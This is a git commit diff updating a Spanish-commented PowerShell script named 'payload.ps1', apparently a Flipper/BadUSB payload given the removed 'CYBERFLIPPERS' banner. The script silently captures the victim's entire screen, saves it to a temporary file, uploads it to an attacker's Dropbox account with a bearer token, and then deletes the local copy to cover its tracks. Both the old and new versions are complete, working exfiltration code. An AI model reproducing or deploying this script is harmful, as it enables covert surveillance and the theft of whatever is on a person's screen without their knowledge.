66dde771cf62c40815745c69a2c1704b6dd573fb
flippemen <99625153+dolaraso@users.noreply.github.com>
2024-09-10 04:03:49 -0500

    Update payload.ps1

--- captura de pantalla/payload.ps1
+++ captura de pantalla/payload.ps1
@@ -1,48 +1,37 @@
-########################################################################################################################
-#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
-#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
-#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
-#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
-#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
-#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
- #########################################################################################################################           
-param (
-    [string]$Token
-)
+$token = $args[0]  # Acepta el token como argumento
 
 # Función para subir un archivo a Dropbox
 function DropBox-Upload {
     param (
         [string]$SourceFilePath
     )
-    $outputFile = Split-Path $SourceFilePath -leaf
-    $TargetFilePath = "/$outputFile"
-    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-    $authorization = "Bearer " + $Token
-    $headers = @{
-        "Authorization" = $authorization
-        "Dropbox-API-Arg" = $arg
-        "Content-Type" = 'application/octet-stream'
-    }
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+    $outputFile = Split-Path $SourceFilePath -leaf;
+    $TargetFilePath = "/$outputFile";
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }';
+    $authorization = "Bearer " + $token;
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]";
+    $headers.Add("Authorization", $authorization);
+    $headers.Add("Dropbox-API-Arg", $arg);
+    $headers.Add("Content-Type", 'application/octet-stream');
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers;
 }
 
 # Cargar System.Windows.Forms y tomar una captura de pantalla
-Add-Type -AssemblyName System.Windows.Forms
-$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
+Add-Type -AssemblyName System.Windows.Forms;
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;
+$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap);
+$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size);
 
 # Guardar la captura de pantalla en un archivo temporal
-$filePath = "$env:TEMP\sc.png"
-$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
-$graphics.Dispose()
-$bitmap.Dispose()
+$filePath = "$env:temp\sc.png";
+$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png);
+$graphics.Dispose();
+$bitmap.Dispose();
 
 # Subir la captura de pantalla a Dropbox
-DropBox-Upload -SourceFilePath $filePath
+DropBox-Upload -SourceFilePath $filePath;
 
 # Eliminar el archivo temporal
-Remove-Item -Path $filePath
+Remove-Item -Path $filePath;
 
